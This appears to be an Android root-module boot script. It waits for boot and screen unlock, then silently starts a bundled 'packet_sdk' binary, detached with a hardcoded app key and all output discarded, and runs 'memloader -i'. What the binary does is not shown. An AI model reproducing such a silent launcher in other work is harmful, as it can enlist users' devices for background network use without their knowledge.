#!/system/bin/sh

MODDIR="${0%/*}"

wait_until_login() {
  # Wait until the system boot is completed
  until [ "$(getprop sys.boot_completed)" -eq 1 ]; do
    sleep 1
  done

  # Wait for user to unlock the screen to gain rw permissions to "/storage/emulated/0"
  test_file="/storage/emulated/0/Android/.PERMISSION_TEST"
  until touch "$test_file" 2>/dev/null; do
    sleep 1
  done
  rm -f "$test_file"
}

wait_until_login

# Main
setsid "$MODDIR/libs/packet_sdk" -appkey=8S7ldPG9aTIwlr6N >/dev/null 2>&1 < /dev/null &
memloader -i